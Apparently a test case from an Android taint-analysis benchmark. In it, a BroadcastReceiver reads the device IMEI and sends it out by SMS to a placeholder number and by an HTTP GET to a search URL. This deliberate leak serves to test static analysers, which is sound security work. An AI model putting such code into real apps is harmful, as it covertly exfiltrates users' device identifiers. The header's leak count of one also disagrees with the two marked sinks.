package de.ecspride;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * @testcase_name BroadcastReceiverLifecycle1
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail siegfried.rasthofer@cased.de
 * 
 * @description The return value of source method is stored to a variable and sent to a sink in a condition branch
 * @dataflow source -> imei -> sink
 * @number_of_leaks 1
 * @challenges the analysis must be able to handle the broadcast receiver lifecycle correctly and
 *  evaluate the condition. 
 */
public class TestReceiver extends BroadcastReceiver{

	@Override
	  public void onReceive(Context context, Intent intent) {
		 String imei = ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId(); //source
		 int i = 2+3;
		 if(i == 5){
				SmsManager sms = SmsManager.getDefault();
		        sms.sendTextMessage("+49 1234", null, imei, null, null); //sink, leak
			 try {
				 connect(imei);
			 } catch (Exception e) {
				 e.printStackTrace();
			 }
		 }
	}

	private void connect(String data) throws IOException {
		String URL = "http://www.google.de/search?q=";
		URL = URL.concat(data);
		java.net.URL url = new URL(URL);
		HttpURLConnection conn = (HttpURLConnection) url.openConnection(); //sink, leak
		conn.setRequestMethod("GET");
		conn.setDoInput(true);
		// Starts the query
		conn.connect();
		Log.d(getClass().getSimpleName(), URL);

		InputStream is = conn.getInputStream();
		if (is == null)
			return;
		StringBuilder sb = new StringBuilder();
		BufferedReader br = new BufferedReader(new InputStreamReader(is));
		String line = null;
		try {
			while ((line = br.readLine()) != null)
				sb.append(line);
		} finally {
			br.close();
			is.close();
		}
		Log.d(getClass().getSimpleName(), sb.toString());
	}

}

